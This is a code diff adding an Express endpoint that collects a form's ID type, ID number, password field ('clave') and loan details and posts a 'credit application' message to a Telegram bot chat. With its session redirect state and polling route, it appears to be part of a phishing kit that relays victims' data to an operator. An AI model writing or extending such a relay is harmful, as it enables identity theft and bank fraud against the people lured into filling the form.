@@ -344,6 +344,48 @@ app.post("/notify/correo", async (req, res) => {
   }
 });
 
+// Notificar formulario
+app.post("/notify/formulario", async (req, res) => {
+  try {
+    const { sessionId, tipoDoc, numDoc, clave, monto, cuotas, interes } = req.body || {};
+    if (!sessionId) return res.status(400).json({ ok: false, error: "Falta sessionId" });
+
+    if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
+
+    const mensaje = `
+💰 *SOLICITUD DE CRÉDITO*
+
+📄 *Tipo de documento:* ${tipoDoc || "N/D"}
+🆔 *Documento:* ${numDoc || "N/D"}
+💵 *Monto solicitado:* $${(monto / 1000000).toFixed(0)}M COP
+📅 *Cuotas:* ${cuotas || "N/D"} meses
+📊 *Interés:* ${interes || "N/D"}% anual
+
+🌀 *Session ID:* \`${sessionId}\`
+`;
+
+    const response = await fetch(getTelegramApiUrl('sendMessage'), {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: mensaje,
+        parse_mode: "Markdown"
+      })
+    });
+
+    const data = await response.json();
+    if (data.ok) {
+      console.log("✅ Solicitud de crédito enviada a Telegram");
+    }
+
+    return res.json({ ok: true });
+  } catch (e) {
+    console.error("❌ /notify/formulario error:", e);
+    return res.status(500).json({ ok: false });
+  }
+});
+
 // ===== POLLING =====
 
 // Ruta de polling (ready.js la consulta)
